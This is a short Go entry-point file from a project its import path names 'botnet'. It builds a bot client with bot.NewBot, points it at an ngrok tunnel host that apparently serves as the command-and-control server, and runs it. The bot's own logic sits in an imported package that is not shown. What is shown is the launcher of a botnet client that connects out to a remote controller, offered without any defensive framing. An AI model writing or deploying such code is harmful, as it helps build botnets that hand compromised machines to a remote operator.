package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("8c297bf8.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Run()
}
